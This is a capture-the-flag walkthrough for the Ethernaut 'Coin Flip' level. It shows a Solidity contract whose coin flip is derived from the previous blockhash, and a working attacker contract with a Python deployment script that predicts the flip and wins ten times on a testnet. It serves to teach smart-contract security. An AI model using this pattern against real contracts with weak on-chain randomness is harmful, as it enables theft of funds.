# 03 - Coin Flip

## Challenge

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

## Summary

Our goal is to win 10 guesses in a row. The `side` generator of a flip is based on

```js
uint256 blockValue = uint256(blockhash(block.number - 1));
lastHash = blockValue;
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

We do not have to calculate the value each time. Instead, we can deploy a contract to calculate this value and call `CoinFlip`'s `flip` function with the correct value. This can be done with the help of [Interface](https://solidity-by-example.org/interface/). Basically, we can create an interface `CoinFlip` with method `flip`, and deploy a contract that will call this method with the correct value. This guarantees that we will win each guess.

## Walkthrough

```py
>>> from cheb3 import Connection
>>> from cheb3.utils import compile_sol
>>> conn = Connection("https://goerli.infura.io/v3/<key>")
>>> account = conn.account("<priv_key>")
>>> contract_addr = '0xe915C1EDb29c6fd5593B7DB4798498Bb9C6225Ff'
```

The interface has exactly the same signature as the method:

```js
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}
```

Now we can continue to finish the contract, which calls `flip` with calculated value:

```js
contract CoinFlipGuess {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flipGuess(address _coinflipAddress) external returns (uint256) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool res = ICoinFlip(_coinflipAddress).flip(side);
        consecutiveWins += res == true ? 1 : 0;
        return consecutiveWins;
    }
}
```

Note that `ICoinFlip(_coinflipAddress).flip(side)` where we gets the instance of `CoinFlip` and call `flip` with the correct value. Using `cheb3`, create, compile and deploy the contract:

```py
>>> abi, bytecode = compile_sol('''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipGuess {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flipGuess(address _coinflipAddress) external returns (uint256) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool res = ICoinFlip(_coinflipAddress).flip(side);
        consecutiveWins += res == true ? 1 : 0;
        return consecutiveWins;
    }
}
''',
solc_version="0.8.17",
base_path="Ethernaut/node_modules/"
)['CoinFlipGuess']

>>> contract = conn.contract(account, abi=abi, bytecode=bytecode)
>>> contract.deploy()
2023-06-04 22:13:47.229 | DEBUG    | cheb3.contract:deploy:96 - Deploying contract ...
2023-06-04 22:13:56.470 | INFO     | cheb3.contract:deploy:101 - The contract is deployed at 0x22eBfE12f13092D7D694f017C09610279aDb6f1e
```

On a side note, for contract deployment, you can also save the contract to `CoinFlipGuess.sol` then call `abi, bytecode = compile_file("CoinFlipGuess.sol", "CoinFlipGuess", "0.8.17")['CoinFlipGuess']`.

Now that the contract is deployed - we just need to call `flipGuess` 10 times with `_coinflipAddress`, which is `contract_addr`.

```py
for _ in range(10):
    contract.functions.flipGuess(contract_addr).send_transaction(gas_limit=1000000) # gas_limit is required
    print("Wins: " + str(contract.functions.consecutiveWins().call()))
    time.sleep(15)
```

The sleep is required because transaction will revert if `lastHash == blockValue` (same block). Finally, submit the instance to pass the level.